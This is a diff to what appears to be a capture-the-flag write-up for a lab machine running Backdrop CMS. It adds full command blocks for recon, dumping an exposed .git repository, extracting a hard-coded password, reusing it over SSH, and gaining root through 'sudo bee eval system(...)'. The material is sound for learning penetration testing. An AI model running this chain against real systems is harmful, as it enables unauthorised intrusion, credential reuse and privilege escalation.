@@ -113,17 +113,69 @@ Root/admin access came from the machine's core misconfiguration or vulnerability
 
 ## 🧰 Command Palette
 
-<details>
-<summary><b>Useful commands and technique anchors</b></summary>
+<details open>
+<summary><b>🔎 Recon</b></summary>
 
-- `git-dumper or manual .git reconstruction`
-- `grep settings.php for database and hash salt values`
-- `Backdrop CMS admin login with recovered password`
-- `ssh johncusack@<target>`
-- `sudo -l`
-- `sudo /usr/local/bin/bee eval 'system(...)'`
+```bash
+sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt 10.129.231.223
+sudo nmap -sC -sV -Pn -p 22,80 -oN nmap_tcp.txt 10.129.231.223
+curl -i http://10.129.231.223/
+feroxbuster -u http://10.129.231.223/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+```
 
 </details>
+
+<details open>
+<summary><b>📦 Exposed Git Repository</b></summary>
+
+```bash
+curl -i http://10.129.231.223/.git/HEAD
+mkdir dog-git && cd dog-git
+git-dumper http://10.129.231.223/.git/ .
+git status
+git log --oneline --all
+find . -iname '*settings*' -o -iname '*config*'
+```
+
+</details>
+
+<details open>
+<summary><b>🔐 Backdrop CMS Secrets</b></summary>
+
+```bash
+grep -R "database\|password\|hash_salt\|BackDrop" -n . | head -50
+grep -R "BackDropJ2024DS2024" -n .
+
+# Validate CMS/admin and SSH reuse paths
+curl -i http://10.129.231.223/user/login
+sshpass -p 'BackDropJ2024DS2024' ssh -o StrictHostKeyChecking=no johncusack@10.129.231.223 'id; hostname'
+```
+
+</details>
+
+<details open>
+<summary><b>🧪 Sudo bee Enumeration</b></summary>
+
+```bash
+sshpass -p 'BackDropJ2024DS2024' ssh -tt johncusack@10.129.231.223 \
+  "printf '%s\n' 'BackDropJ2024DS2024' | sudo -S -l"
+
+sshpass -p 'BackDropJ2024DS2024' ssh johncusack@10.129.231.223 \
+  'cd /var/www/html && /usr/local/bin/bee status'
+```
+
+</details>
+
+<details open>
+<summary><b>👑 sudo bee eval to root</b></summary>
+
+```bash
+sshpass -p 'BackDropJ2024DS2024' ssh -tt johncusack@10.129.231.223 \
+  "cd /var/www/html && printf '%s\n' 'BackDropJ2024DS2024' | sudo -S /usr/local/bin/bee eval 'system(\"id; cat /root/root.txt\");'"
+```
+
+</details>
+
 
 ---
 
